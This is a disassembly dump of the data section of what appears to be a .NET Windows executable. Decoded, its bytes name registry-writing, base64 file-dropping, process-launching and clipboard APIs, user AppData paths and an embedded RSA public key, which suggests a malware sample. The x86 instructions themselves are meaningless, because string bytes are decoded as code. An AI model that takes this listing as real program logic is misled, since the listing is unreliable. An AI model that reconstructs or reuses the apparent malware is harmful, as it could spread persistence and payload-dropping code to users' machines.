  40574a:	00 50 72             	add    %dl,0x72(%eax)
  40574d:	6f                   	outsl  %ds:(%esi),(%dx)
  40574e:	63 65 73             	arpl   %esp,0x73(%ebp)
  405751:	73 53                	jae    0x4057a6
  405753:	74 61                	je     0x4057b6
  405755:	72 74                	jb     0x4057cb
  405757:	49                   	dec    %ecx
  405758:	6e                   	outsb  %ds:(%esi),(%dx)
  405759:	66 6f                	outsw  %ds:(%esi),(%dx)
  40575b:	00 73 65             	add    %dh,0x65(%ebx)
  40575e:	74 5f                	je     0x4057bf
  405760:	57                   	push   %edi
  405761:	6f                   	outsl  %ds:(%esi),(%dx)
  405762:	72 6b                	jb     0x4057cf
  405764:	69 6e 67 44 69 72 65 	imul   $0x65726944,0x67(%esi),%ebp
  40576b:	63 74 6f 72          	arpl   %esi,0x72(%edi,%ebp,2)
  40576f:	79 00                	jns    0x405771
  405771:	73 65                	jae    0x4057d8
  405773:	74 5f                	je     0x4057d4
  405775:	53                   	push   %ebx
  405776:	74 61                	je     0x4057d9
  405778:	72 74                	jb     0x4057ee
  40577a:	49                   	dec    %ecx
  40577b:	6e                   	outsb  %ds:(%esi),(%dx)
  40577c:	66 6f                	outsw  %ds:(%esi),(%dx)
  40577e:	00 73 65             	add    %dh,0x65(%ebx)
  405781:	74 5f                	je     0x4057e2
  405783:	55                   	push   %ebp
  405784:	73 65                	jae    0x4057eb
  405786:	53                   	push   %ebx
  405787:	68 65 6c 6c 45       	push   $0x456c6c65
  40578c:	78 65                	js     0x4057f3
  40578e:	63 75 74             	arpl   %esi,0x74(%ebp)
  405791:	65 00 73 65          	add    %dh,%gs:0x65(%ebx)
  405795:	74 5f                	je     0x4057f6
  405797:	56                   	push   %esi
  405798:	65 72 62             	gs jb  0x4057fd
  40579b:	00 50 72             	add    %dl,0x72(%eax)
  40579e:	6f                   	outsl  %ds:(%esi),(%dx)
  40579f:	63 65 73             	arpl   %esp,0x73(%ebp)
  4057a2:	73 57                	jae    0x4057fb
  4057a4:	69 6e 64 6f 77 53 74 	imul   $0x7453776f,0x64(%esi),%ebp
  4057ab:	79 6c                	jns    0x405819
  4057ad:	65 00 73 65          	add    %dh,%gs:0x65(%ebx)
  4057b1:	74 5f                	je     0x405812
  4057b3:	57                   	push   %edi
  4057b4:	69 6e 64 6f 77 53 74 	imul   $0x7453776f,0x64(%esi),%ebp
  4057bb:	79 6c                	jns    0x405829
  4057bd:	65 00 53 79          	add    %dl,%gs:0x79(%ebx)
  4057c1:	73 74                	jae    0x405837
  4057c3:	65 6d                	gs insl (%dx),%es:(%edi)
  4057c5:	2e 43                	cs inc %ebx
  4057c7:	6f                   	outsl  %ds:(%esi),(%dx)
  4057c8:	6d                   	insl   (%dx),%es:(%edi)
  4057c9:	70 6f                	jo     0x40583a
  4057cb:	6e                   	outsb  %ds:(%esi),(%dx)
  4057cc:	65 6e                	outsb  %gs:(%esi),(%dx)
  4057ce:	74 4d                	je     0x40581d
  4057d0:	6f                   	outsl  %ds:(%esi),(%dx)
  4057d1:	64 65 6c             	fs gs insb (%dx),%es:(%edi)
  4057d4:	00 57 69             	add    %dl,0x69(%edi)
  4057d7:	6e                   	outsb  %ds:(%esi),(%dx)
  4057d8:	33 32                	xor    (%edx),%esi
  4057da:	45                   	inc    %ebp
  4057db:	78 63                	js     0x405840
  4057dd:	65 70 74             	gs jo  0x405854
  4057e0:	69 6f 6e 00 67 65 74 	imul   $0x74656700,0x6e(%edi),%ebp
  4057e7:	5f                   	pop    %edi
  4057e8:	4e                   	dec    %esi
  4057e9:	61                   	popa
  4057ea:	74 69                	je     0x405855
  4057ec:	76 65                	jbe    0x405853
  4057ee:	45                   	inc    %ebp
  4057ef:	72 72                	jb     0x405863
  4057f1:	6f                   	outsl  %ds:(%esi),(%dx)
  4057f2:	72 43                	jb     0x405837
  4057f4:	6f                   	outsl  %ds:(%esi),(%dx)
  4057f5:	64 65 00 67 65       	fs add %ah,%gs:0x65(%edi)
  4057fa:	74 5f                	je     0x40585b
  4057fc:	50                   	push   %eax
  4057fd:	72 6f                	jb     0x40586e
  4057ff:	63 65 73             	arpl   %esp,0x73(%ebp)
  405802:	73 4e                	jae    0x405852
  405804:	61                   	popa
  405805:	6d                   	insl   (%dx),%es:(%edi)
  405806:	65 00 57 72          	add    %dl,%gs:0x72(%edi)
  40580a:	69 74 65 4c 69 6e 65 	imul   $0x656e69,0x4c(%ebp,%eiz,2),%esi
  405811:	00 
  405812:	52                   	push   %edx
  405813:	65 70 6c             	gs jo  0x405882
  405816:	61                   	popa
  405817:	63 65 00             	arpl   %esp,0x0(%ebp)
  40581a:	4d                   	dec    %ebp
  40581b:	69 63 72 6f 73 6f 66 	imul   $0x666f736f,0x72(%ebx),%esp
  405822:	74 2e                	je     0x405852
  405824:	57                   	push   %edi
  405825:	69 6e 33 32 00 52 65 	imul   $0x65520032,0x33(%esi),%ebp
  40582c:	67 69 73 74 72 79 00 	imul   $0x52007972,0x74(%bp,%di),%esi
  405833:	52 
  405834:	65 67 69 73 74 72 79 	imul   $0x654b7972,%gs:0x74(%bp,%di),%esi
  40583b:	4b 65 
  40583d:	79 00                	jns    0x40583f
  40583f:	43                   	inc    %ebx
  405840:	75 72                	jne    0x4058b4
  405842:	72 65                	jb     0x4058a9
  405844:	6e                   	outsb  %ds:(%esi),(%dx)
  405845:	74 55                	je     0x40589c
  405847:	73 65                	jae    0x4058ae
  405849:	72 00                	jb     0x40584b
  40584b:	4f                   	dec    %edi
  40584c:	70 65                	jo     0x4058b3
  40584e:	6e                   	outsb  %ds:(%esi),(%dx)
  40584f:	53                   	push   %ebx
  405850:	75 62                	jne    0x4058b4
  405852:	4b                   	dec    %ebx
  405853:	65 79 00             	gs jns 0x405856
  405856:	53                   	push   %ebx
  405857:	65 74 56             	gs je  0x4058b0
  40585a:	61                   	popa
  40585b:	6c                   	insb   (%dx),%es:(%edi)
  40585c:	75 65                	jne    0x4058c3
  40585e:	00 73 65             	add    %dh,0x65(%ebx)
  405861:	74 5f                	je     0x4058c2
  405863:	46                   	inc    %esi
  405864:	69 6c 65 4e 61 6d 65 	imul   $0x656d61,0x4e(%ebp,%eiz,2),%ebp
  40586b:	00 
  40586c:	73 65                	jae    0x4058d3
  40586e:	74 5f                	je     0x4058cf
  405870:	41                   	inc    %ecx
  405871:	72 67                	jb     0x4058da
  405873:	75 6d                	jne    0x4058e2
  405875:	65 6e                	outsb  %gs:(%esi),(%dx)
  405877:	74 73                	je     0x4058ec
  405879:	00 57 61             	add    %dl,0x61(%edi)
  40587c:	69 74 46 6f 72 45 78 	imul   $0x69784572,0x6f(%esi,%eax,2),%esi
  405883:	69 
  405884:	74 00                	je     0x405886
  405886:	43                   	inc    %ebx
  405887:	72 65                	jb     0x4058ee
  405889:	61                   	popa
  40588a:	74 65                	je     0x4058f1
  40588c:	53                   	push   %ebx
  40588d:	75 62                	jne    0x4058f1
  40588f:	4b                   	dec    %ebx
  405890:	65 79 00             	gs jns 0x405893
  405893:	47                   	inc    %edi
  405894:	65 74 54             	gs je  0x4058eb
  405897:	65 6d                	gs insl (%dx),%es:(%edi)
  405899:	70 50                	jo     0x4058eb
  40589b:	61                   	popa
  40589c:	74 68                	je     0x405906
  40589e:	00 46 72             	add    %al,0x72(%esi)
  4058a1:	6f                   	outsl  %ds:(%esi),(%dx)
  4058a2:	6d                   	insl   (%dx),%es:(%edi)
  4058a3:	42                   	inc    %edx
  4058a4:	61                   	popa
  4058a5:	73 65                	jae    0x40590c
  4058a7:	36 34 53             	ss xor $0x53,%al
  4058aa:	74 72                	je     0x40591e
  4058ac:	69 6e 67 00 57 72 69 	imul   $0x69725700,0x67(%esi),%ebp
  4058b3:	74 65                	je     0x40591a
  4058b5:	41                   	inc    %ecx
  4058b6:	6c                   	insb   (%dx),%es:(%edi)
  4058b7:	6c                   	insb   (%dx),%es:(%edi)
  4058b8:	42                   	inc    %edx
  4058b9:	79 74                	jns    0x40592f
  4058bb:	65 73 00             	gs jae 0x4058be
  4058be:	2e 63 63 74          	arpl   %esp,%cs:0x74(%ebx)
  4058c2:	6f                   	outsl  %ds:(%esi),(%dx)
  4058c3:	72 00                	jb     0x4058c5
  4058c5:	67 65 74 5f          	addr16 gs je 0x405928
  4058c9:	55                   	push   %ebp
  4058ca:	73 65                	jae    0x405931
  4058cc:	72 4e                	jb     0x40591c
  4058ce:	61                   	popa
  4058cf:	6d                   	insl   (%dx),%es:(%edi)
  4058d0:	65 00 41 64          	add    %al,%gs:0x64(%ecx)
  4058d4:	64 00 49 6e          	add    %cl,%fs:0x6e(%ecx)
  4058d8:	74 50                	je     0x40592a
  4058da:	74 72                	je     0x40594e
  4058dc:	00 43 6f             	add    %al,0x6f(%ebx)
  4058df:	6e                   	outsb  %ds:(%esi),(%dx)
  4058e0:	74 72                	je     0x405954
  4058e2:	6f                   	outsl  %ds:(%esi),(%dx)
  4058e3:	6c                   	insb   (%dx),%es:(%edi)
  4058e4:	00 67 65             	add    %ah,0x65(%edi)
  4058e7:	74 5f                	je     0x405948
  4058e9:	48                   	dec    %eax
  4058ea:	61                   	popa
  4058eb:	6e                   	outsb  %ds:(%esi),(%dx)
  4058ec:	64 6c                	fs insb (%dx),%es:(%edi)
  4058ee:	65 00 4d 61          	add    %cl,%gs:0x61(%ebp)
  4058f2:	74 63                	je     0x405957
  4058f4:	68 00 47 72 6f       	push   $0x6f724700
  4058f9:	75 70                	jne    0x40596b
  4058fb:	00 67 65             	add    %ah,0x65(%edi)
  4058fe:	74 5f                	je     0x40595f
  405900:	53                   	push   %ebx
  405901:	75 63                	jne    0x405966
  405903:	63 65 73             	arpl   %esp,0x73(%ebp)
  405906:	73 00                	jae    0x405908
  405908:	67 65 74 5f          	addr16 gs je 0x40596b
  40590c:	4d                   	dec    %ebp
  40590d:	73 67                	jae    0x405976
  40590f:	00 53 74             	add    %dl,0x74(%ebx)
  405912:	61                   	popa
  405913:	72 74                	jb     0x405989
  405915:	73 57                	jae    0x40596e
  405917:	69 74 68 00 67 65 74 	imul   $0x5f746567,0x0(%eax,%ebp,2),%esi
  40591e:	5f 
  40591f:	45                   	inc    %ebp
  405920:	78 53                	js     0x405975
  405922:	74 79                	je     0x40599d
  405924:	6c                   	insb   (%dx),%es:(%edi)
  405925:	65 00 73 65          	add    %dh,%gs:0x65(%ebx)
  405929:	74 5f                	je     0x40598a
  40592b:	45                   	inc    %ebp
  40592c:	78 53                	js     0x405981
  40592e:	74 79                	je     0x4059a9
  405930:	6c                   	insb   (%dx),%es:(%edi)
  405931:	65 00 3c 3e          	add    %bh,%gs:(%esi,%edi,1)
  405935:	63 5f 5f             	arpl   %ebx,0x5f(%edi)
  405938:	44                   	inc    %esp
  405939:	69 73 70 6c 61 79 43 	imul   $0x4379616c,0x70(%ebx),%esi
  405940:	6c                   	insb   (%dx),%es:(%edi)
  405941:	61                   	popa
  405942:	73 73                	jae    0x4059b7
  405944:	31 00                	xor    %eax,(%eax)
  405946:	52                   	push   %edx
  405947:	65 74 75             	gs je  0x4059bf
  40594a:	72 6e                	jb     0x4059ba
  40594c:	56                   	push   %esi
  40594d:	61                   	popa
  40594e:	6c                   	insb   (%dx),%es:(%edi)
  40594f:	75 65                	jne    0x4059b6
  405951:	00 3c 47             	add    %bh,(%edi,%eax,2)
  405954:	65 74 54             	gs je  0x4059ab
  405957:	65 78 74             	gs js  0x4059ce
  40595a:	3e 62 5f 5f          	bound  %ebx,%ds:0x5f(%edi)
  40595e:	30 00                	xor    %al,(%eax)
  405960:	43                   	inc    %ebx
  405961:	6c                   	insb   (%dx),%es:(%edi)
  405962:	69 70 62 6f 61 72 64 	imul   $0x6472616f,0x62(%eax),%esi
  405969:	00 45 6d             	add    %al,0x6d(%ebp)
  40596c:	70 74                	jo     0x4059e2
  40596e:	79 00                	jns    0x405970
  405970:	41                   	inc    %ecx
  405971:	70 61                	jo     0x4059d4
  405973:	72 74                	jb     0x4059e9
  405975:	6d                   	insl   (%dx),%es:(%edi)
  405976:	65 6e                	outsb  %gs:(%esi),(%dx)
  405978:	74 53                	je     0x4059cd
  40597a:	74 61                	je     0x4059dd
  40597c:	74 65                	je     0x4059e3
  40597e:	00 53 65             	add    %dl,0x65(%ebx)
  405981:	74 41                	je     0x4059c4
  405983:	70 61                	jo     0x4059e6
  405985:	72 74                	jb     0x4059fb
  405987:	6d                   	insl   (%dx),%es:(%edi)
  405988:	65 6e                	outsb  %gs:(%esi),(%dx)
  40598a:	74 53                	je     0x4059df
  40598c:	74 61                	je     0x4059ef
  40598e:	74 65                	je     0x4059f5
  405990:	00 4a 6f             	add    %cl,0x6f(%edx)
  405993:	69 6e 00 3c 3e 63 5f 	imul   $0x5f633e3c,0x0(%esi),%ebp
  40599a:	5f                   	pop    %edi
  40599b:	44                   	inc    %esp
  40599c:	69 73 70 6c 61 79 43 	imul   $0x4379616c,0x70(%ebx),%esi
  4059a3:	6c                   	insb   (%dx),%es:(%edi)
  4059a4:	61                   	popa
  4059a5:	73 73                	jae    0x405a1a
  4059a7:	34 00                	xor    $0x0,%al
  4059a9:	3c 53                	cmp    $0x53,%al
  4059ab:	65 74 54             	gs je  0x405a02
  4059ae:	65 78 74             	gs js  0x405a25
  4059b1:	3e 62 5f 5f          	bound  %ebx,%ds:0x5f(%edi)
  4059b5:	33 00                	xor    (%eax),%eax
  4059b7:	00 00                	add    %al,(%eax)
  4059b9:	49                   	dec    %ecx
  4059ba:	61                   	popa
  4059bb:	00 62 00             	add    %ah,0x0(%edx)
  4059be:	63 00                	arpl   %eax,(%eax)
  4059c0:	64 00 65 00          	add    %ah,%fs:0x0(%ebp)
  4059c4:	66 00 67 00          	data16 add %ah,0x0(%edi)
  4059c8:	68 00 69 00 6a       	push   $0x6a006900
  4059cd:	00 6b 00             	add    %ch,0x0(%ebx)
  4059d0:	6c                   	insb   (%dx),%es:(%edi)
  4059d1:	00 6d 00             	add    %ch,0x0(%ebp)
  4059d4:	6e                   	outsb  %ds:(%esi),(%dx)
  4059d5:	00 6f 00             	add    %ch,0x0(%edi)
  4059d8:	70 00                	jo     0x4059da
  4059da:	71 00                	jno    0x4059dc
  4059dc:	72 00                	jb     0x4059de
  4059de:	73 00                	jae    0x4059e0
  4059e0:	74 00                	je     0x4059e2
  4059e2:	75 00                	jne    0x4059e4
  4059e4:	76 00                	jbe    0x4059e6
  4059e6:	77 00                	ja     0x4059e8
  4059e8:	78 00                	js     0x4059ea
  4059ea:	79 00                	jns    0x4059ec
  4059ec:	7a 00                	jp     0x4059ee
  4059ee:	30 00                	xor    %al,(%eax)
  4059f0:	31 00                	xor    %eax,(%eax)
  4059f2:	32 00                	xor    (%eax),%al
  4059f4:	33 00                	xor    (%eax),%eax
  4059f6:	34 00                	xor    $0x0,%al
  4059f8:	35 00 36 00 37       	xor    $0x37003600,%eax
  4059fd:	00 38                	add    %bh,(%eax)
  4059ff:	00 39                	add    %bh,(%ecx)
  405a01:	00 00                	add    %al,(%eax)
  405a03:	01 00                	add    %eax,(%eax)
  405a05:	03 2f                	add    (%edi),%ebp
  405a07:	00 00                	add    %al,(%eax)
  405a09:	1b 61 00             	sbb    0x0(%ecx),%esp
  405a0c:	70 00                	jo     0x405a0e
  405a0e:	70 00                	jo     0x405a10
  405a10:	64 00 61 00          	add    %ah,%fs:0x0(%ecx)
  405a14:	74 00                	je     0x405a16
  405a16:	61                   	popa
  405a17:	00 5c 00 6c          	add    %bl,0x6c(%eax,%eax,1)
  405a1b:	00 6f 00             	add    %ch,0x0(%edi)
  405a1e:	63 00                	arpl   %eax,(%eax)
  405a20:	61                   	popa
  405a21:	00 6c 00 00          	add    %ch,0x0(%eax,%eax,1)
  405a25:	21 61 00             	and    %esp,0x0(%ecx)
  405a28:	70 00                	jo     0x405a2a
  405a2a:	70 00                	jo     0x405a2c
  405a2c:	64 00 61 00          	add    %ah,%fs:0x0(%ecx)
  405a30:	74 00                	je     0x405a32
  405a32:	61                   	popa
  405a33:	00 5c 00 6c          	add    %bl,0x6c(%eax,%eax,1)
  405a37:	00 6f 00             	add    %ch,0x0(%edi)
  405a3a:	63 00                	arpl   %eax,(%eax)
  405a3c:	61                   	popa
  405a3d:	00 6c 00 6c          	add    %ch,0x6c(%eax,%eax,1)
  405a41:	00 6f 00             	add    %ch,0x0(%edi)
  405a44:	77 00                	ja     0x405a46
  405a46:	00 4f 3c             	add    %cl,0x3c(%edi)
  405a49:	00 3f                	add    %bh,(%edi)
  405a4b:	00 78 00             	add    %bh,0x0(%eax)
  405a4e:	6d                   	insl   (%dx),%es:(%edi)
  405a4f:	00 6c 00 20          	add    %ch,0x20(%eax,%eax,1)
  405a53:	00 76 00             	add    %dh,0x0(%esi)
  405a56:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  405a5a:	73 00                	jae    0x405a5c
  405a5c:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  405a62:	3d 00 22 00 31       	cmp    $0x31002200,%eax
  405a67:	00 2e                	add    %ch,(%esi)
  405a69:	00 30                	add    %dh,(%eax)
  405a6b:	00 22                	add    %ah,(%edx)
  405a6d:	00 20                	add    %ah,(%eax)
  405a6f:	00 65 00             	add    %ah,0x0(%ebp)
  405a72:	6e                   	outsb  %ds:(%esi),(%dx)
  405a73:	00 63 00             	add    %ah,0x0(%ebx)
  405a76:	6f                   	outsl  %ds:(%esi),(%dx)
  405a77:	00 64 00 69          	add    %ah,0x69(%eax,%eax,1)
  405a7b:	00 6e 00             	add    %ch,0x0(%esi)
  405a7e:	67 00 3d             	add    %bh,(%di)
  405a81:	00 22                	add    %ah,(%edx)
  405a83:	00 75 00             	add    %dh,0x0(%ebp)
  405a86:	74 00                	je     0x405a88
  405a88:	66 00 2d 00 31 00 36 	data16 add %ch,0x36003100
  405a8f:	00 22                	add    %ah,(%edx)
  405a91:	00 3f                	add    %bh,(%edi)
  405a93:	00 3e                	add    %bh,(%esi)
  405a95:	00 01                	add    %al,(%ecx)
  405a97:	80 e5 3c             	and    $0x3c,%ch
  405a9a:	00 52 00             	add    %dl,0x0(%edx)
  405a9d:	53                   	push   %ebx
  405a9e:	00 41 00             	add    %al,0x0(%ecx)
  405aa1:	50                   	push   %eax
  405aa2:	00 61 00             	add    %ah,0x0(%ecx)
  405aa5:	72 00                	jb     0x405aa7
  405aa7:	61                   	popa
  405aa8:	00 6d 00             	add    %ch,0x0(%ebp)
  405aab:	65 00 74 00 65       	add    %dh,%gs:0x65(%eax,%eax,1)
  405ab0:	00 72 00             	add    %dh,0x0(%edx)
  405ab3:	73 00                	jae    0x405ab5
  405ab5:	20 00                	and    %al,(%eax)
  405ab7:	78 00                	js     0x405ab9
  405ab9:	6d                   	insl   (%dx),%es:(%edi)
  405aba:	00 6c 00 6e          	add    %ch,0x6e(%eax,%eax,1)
  405abe:	00 73 00             	add    %dh,0x0(%ebx)
  405ac1:	3a 00                	cmp    (%eax),%al
  405ac3:	78 00                	js     0x405ac5
  405ac5:	73 00                	jae    0x405ac7
  405ac7:	64 00 3d 00 22 00 68 	add    %bh,%fs:0x68002200
  405ace:	00 74 00 74          	add    %dh,0x74(%eax,%eax,1)
  405ad2:	00 70 00             	add    %dh,0x0(%eax)
  405ad5:	3a 00                	cmp    (%eax),%al
  405ad7:	2f                   	das
  405ad8:	00 2f                	add    %ch,(%edi)
  405ada:	00 77 00             	add    %dh,0x0(%edi)
  405add:	77 00                	ja     0x405adf
  405adf:	77 00                	ja     0x405ae1
  405ae1:	2e 00 77 00          	add    %dh,%cs:0x0(%edi)
  405ae5:	33 00                	xor    (%eax),%eax
  405ae7:	2e 00 6f 00          	add    %ch,%cs:0x0(%edi)
  405aeb:	72 00                	jb     0x405aed
  405aed:	67 00 2f             	add    %ch,(%bx)
  405af0:	00 32                	add    %dh,(%edx)
  405af2:	00 30                	add    %dh,(%eax)
  405af4:	00 30                	add    %dh,(%eax)
  405af6:	00 31                	add    %dh,(%ecx)
  405af8:	00 2f                	add    %ch,(%edi)
  405afa:	00 58 00             	add    %bl,0x0(%eax)
  405afd:	4d                   	dec    %ebp
  405afe:	00 4c 00 53          	add    %cl,0x53(%eax,%eax,1)
  405b02:	00 63 00             	add    %ah,0x0(%ebx)
  405b05:	68 00 65 00 6d       	push   $0x6d006500
  405b0a:	00 61 00             	add    %ah,0x0(%ecx)
  405b0d:	22 00                	and    (%eax),%al
  405b0f:	20 00                	and    %al,(%eax)
  405b11:	78 00                	js     0x405b13
  405b13:	6d                   	insl   (%dx),%es:(%edi)
  405b14:	00 6c 00 6e          	add    %ch,0x6e(%eax,%eax,1)
  405b18:	00 73 00             	add    %dh,0x0(%ebx)
  405b1b:	3a 00                	cmp    (%eax),%al
  405b1d:	78 00                	js     0x405b1f
  405b1f:	73 00                	jae    0x405b21
  405b21:	69 00 3d 00 22 00    	imul   $0x22003d,(%eax),%eax
  405b27:	68 00 74 00 74       	push   $0x74007400
  405b2c:	00 70 00             	add    %dh,0x0(%eax)
  405b2f:	3a 00                	cmp    (%eax),%al
  405b31:	2f                   	das
  405b32:	00 2f                	add    %ch,(%edi)
  405b34:	00 77 00             	add    %dh,0x0(%edi)
  405b37:	77 00                	ja     0x405b39
  405b39:	77 00                	ja     0x405b3b
  405b3b:	2e 00 77 00          	add    %dh,%cs:0x0(%edi)
  405b3f:	33 00                	xor    (%eax),%eax
  405b41:	2e 00 6f 00          	add    %ch,%cs:0x0(%edi)
  405b45:	72 00                	jb     0x405b47
  405b47:	67 00 2f             	add    %ch,(%bx)
  405b4a:	00 32                	add    %dh,(%edx)
  405b4c:	00 30                	add    %dh,(%eax)
  405b4e:	00 30                	add    %dh,(%eax)
  405b50:	00 31                	add    %dh,(%ecx)
  405b52:	00 2f                	add    %ch,(%edi)
  405b54:	00 58 00             	add    %bl,0x0(%eax)
  405b57:	4d                   	dec    %ebp
  405b58:	00 4c 00 53          	add    %cl,0x53(%eax,%eax,1)
  405b5c:	00 63 00             	add    %ah,0x0(%ebx)
  405b5f:	68 00 65 00 6d       	push   $0x6d006500
  405b64:	00 61 00             	add    %ah,0x0(%ecx)
  405b67:	2d 00 69 00 6e       	sub    $0x6e006900,%eax
  405b6c:	00 73 00             	add    %dh,0x0(%ebx)
  405b6f:	74 00                	je     0x405b71
  405b71:	61                   	popa
  405b72:	00 6e 00             	add    %ch,0x0(%esi)
  405b75:	63 00                	arpl   %eax,(%eax)
  405b77:	65 00 22             	add    %ah,%gs:(%edx)
  405b7a:	00 3e                	add    %bh,(%esi)
  405b7c:	00 01                	add    %al,(%ecx)
  405b7e:	37                   	aaa
  405b7f:	20 00                	and    %al,(%eax)
  405b81:	20 00                	and    %al,(%eax)
  405b83:	3c 00                	cmp    $0x0,%al
  405b85:	45                   	inc    %ebp
  405b86:	00 78 00             	add    %bh,0x0(%eax)
  405b89:	70 00                	jo     0x405b8b
  405b8b:	6f                   	outsl  %ds:(%esi),(%dx)
  405b8c:	00 6e 00             	add    %ch,0x0(%esi)
  405b8f:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  405b93:	74 00                	je     0x405b95
  405b95:	3e 00 41 00          	add    %al,%ds:0x0(%ecx)
  405b99:	51                   	push   %ecx
  405b9a:	00 41 00             	add    %al,0x0(%ecx)
  405b9d:	42                   	inc    %edx
  405b9e:	00 3c 00             	add    %bh,(%eax,%eax,1)
  405ba1:	2f                   	das
  405ba2:	00 45 00             	add    %al,0x0(%ebp)
  405ba5:	78 00                	js     0x405ba7
  405ba7:	70 00                	jo     0x405ba9
  405ba9:	6f                   	outsl  %ds:(%esi),(%dx)
  405baa:	00 6e 00             	add    %ch,0x0(%esi)
  405bad:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  405bb1:	74 00                	je     0x405bb3
  405bb3:	3e 00 00             	add    %al,%ds:(%eax)
  405bb6:	82 db 20             	sbb    $0x20,%bl
  405bb9:	00 20                	add    %ah,(%eax)
  405bbb:	00 3c 00             	add    %bh,(%eax,%eax,1)
  405bbe:	4d                   	dec    %ebp
  405bbf:	00 6f 00             	add    %ch,0x0(%edi)
  405bc2:	64 00 75 00          	add    %dh,%fs:0x0(%ebp)
  405bc6:	6c                   	insb   (%dx),%es:(%edi)
  405bc7:	00 75 00             	add    %dh,0x0(%ebp)
  405bca:	73 00                	jae    0x405bcc
  405bcc:	3e 00 36             	add    %dh,%ds:(%esi)
  405bcf:	00 63 00             	add    %ah,0x0(%ebx)
  405bd2:	4a                   	dec    %edx
  405bd3:	00 41 00             	add    %al,0x0(%ecx)
  405bd6:	74 00                	je     0x405bd8
  405bd8:	56                   	push   %esi
  405bd9:	00 5a 00             	add    %bl,0x0(%edx)
  405bdc:	69 00 76 00 48 00    	imul   $0x480076,(%eax),%eax
  405be2:	73 00                	jae    0x405be4
  405be4:	31 00                	xor    %eax,(%eax)
  405be6:	67 00 43 00          	add    %al,0x0(%bp,%di)
  405bea:	67 00 46 00          	add    %al,0x0(%bp)
  405bee:	68 00 34 00 67       	push   $0x67003400
  405bf3:	00 47 00             	add    %al,0x0(%edi)
  405bf6:	55                   	push   %ebp
  405bf7:	00 61 00             	add    %ah,0x0(%ecx)
  405bfa:	41                   	inc    %ecx
  405bfb:	00 69 00             	add    %ch,0x0(%ecx)
  405bfe:	6b 00 6c             	imul   $0x6c,(%eax),%eax
  405c01:	00 72 00             	add    %dh,0x0(%edx)
  405c04:	52                   	push   %edx
  405c05:	00 57 00             	add    %dl,0x0(%edi)
  405c08:	4d                   	dec    %ebp
  405c09:	00 69 00             	add    %ch,0x0(%ecx)
  405c0c:	31 00                	xor    %eax,(%eax)
  405c0e:	32 00                	xor    (%eax),%al
  405c10:	76 00                	jbe    0x405c12
  405c12:	6e                   	outsb  %ds:(%esi),(%dx)
  405c13:	00 38                	add    %bh,(%eax)
  405c15:	00 72 00             	add    %dh,0x0(%edx)
  405c18:	61                   	popa
  405c19:	00 51 00             	add    %dl,0x0(%ecx)
  405c1c:	52                   	push   %edx
  405c1d:	00 50 00             	add    %dl,0x0(%eax)
  405c20:	42                   	inc    %edx
  405c21:	00 5a 00             	add    %bl,0x0(%edx)
  405c24:	51                   	push   %ecx
  405c25:	00 6b 00             	add    %ch,0x0(%ebx)
  405c28:	73 00                	jae    0x405c2a
  405c2a:	42                   	inc    %edx
  405c2b:	00 4c 00 46          	add    %cl,0x46(%eax,%eax,1)
  405c2f:	00 32                	add    %dh,(%edx)
  405c31:	00 76 00             	add    %dh,0x0(%esi)
  405c34:	6b 00 43             	imul   $0x43,(%eax),%eax
  405c37:	00 43 00             	add    %al,0x0(%ebx)
  405c3a:	64 00 77 00          	add    %dh,%fs:0x0(%edi)
  405c3e:	69 00 72 00 6c 00    	imul   $0x6c0072,(%eax),%eax
  405c44:	39 00                	cmp    %eax,(%eax)
  405c46:	54                   	push   %esp
  405c47:	00 31                	add    %dh,(%ecx)
  405c49:	00 77 00             	add    %dh,0x0(%edi)
  405c4c:	73 00                	jae    0x405c4e
  405c4e:	30 00                	xor    %al,(%eax)
  405c50:	73 00                	jae    0x405c52
  405c52:	5a                   	pop    %edx
  405c53:	00 6a 00             	add    %ch,0x0(%edx)
  405c56:	77 00                	ja     0x405c58
  405c58:	67 00 74 00          	add    %dh,0x0(%si)
  405c5c:	66 00 43 00          	data16 add %al,0x0(%ebx)
  405c60:	66 00 44 00 67       	data16 add %al,0x67(%eax,%eax,1)
  405c65:	00 67 00             	add    %ah,0x0(%edi)
  405c68:	2b 00                	sub    (%eax),%eax
  405c6a:	61                   	popa
  405c6b:	00 7a 00             	add    %bh,0x0(%edx)
  405c6e:	57                   	push   %edi
  405c6f:	00 42 00             	add    %al,0x0(%edx)
  405c72:	49                   	dec    %ecx
  405c73:	00 70 00             	add    %dh,0x0(%eax)
  405c76:	68 00 57 00 2f       	push   $0x2f005700
  405c7b:	00 73 00             	add    %dh,0x0(%ebx)
  405c7e:	69 00 58 00 69 00    	imul   $0x690058,(%eax),%eax
  405c84:	63 00                	arpl   %eax,(%eax)
  405c86:	6f                   	outsl  %ds:(%esi),(%dx)
  405c87:	00 6a 00             	add    %ch,0x0(%edx)
  405c8a:	63 00                	arpl   %eax,(%eax)
  405c8c:	42                   	inc    %edx
  405c8d:	00 37                	add    %dh,(%edi)
  405c8f:	00 36                	add    %dh,(%esi)
  405c91:	00 6d 00             	add    %ch,0x0(%ebp)
  405c94:	53                   	push   %ebx
  405c95:	00 32                	add    %dh,(%edx)
  405c97:	00 79 00             	add    %bh,0x0(%ecx)
  405c9a:	50                   	push   %eax
  405c9b:	00 33                	add    %dh,(%ebx)
  405c9d:	00 70 00             	add    %dh,0x0(%eax)
  405ca0:	57                   	push   %edi
  405ca1:	00 66 00             	add    %ah,0x0(%esi)
  405ca4:	35 00 68 00 52       	xor    $0x52006800,%eax
  405ca9:	00 44 00 44          	add    %al,0x44(%eax,%eax,1)
  405cad:	00 45 00             	add    %al,0x0(%ebp)
  405cb0:	34 00                	xor    $0x0,%al
  405cb2:	63 00                	arpl   %eax,(%eax)
  405cb4:	35 00 66 00 67       	xor    $0x67006600,%eax
  405cb9:	00 6c 00 62          	add    %ch,0x62(%eax,%eax,1)
  405cbd:	00 62 00             	add    %ah,0x0(%edx)
  405cc0:	53                   	push   %ebx
  405cc1:	00 74 00 4d          	add    %dh,0x4d(%eax,%eax,1)
  405cc5:	00 61 00             	add    %ah,0x0(%ecx)
  405cc8:	57                   	push   %edi
  405cc9:	00 32                	add    %dh,(%edx)
  405ccb:	00 69 00             	add    %ch,0x0(%ecx)
  405cce:	35 00 36 00 4d       	xor    $0x4d003600,%eax
  405cd3:	00 64 00 4c          	add    %ah,0x4c(%eax,%eax,1)
  405cd7:	00 64 00 53          	add    %ah,0x53(%eax,%eax,1)
  405cdb:	00 59 00             	add    %bl,0x0(%ecx)
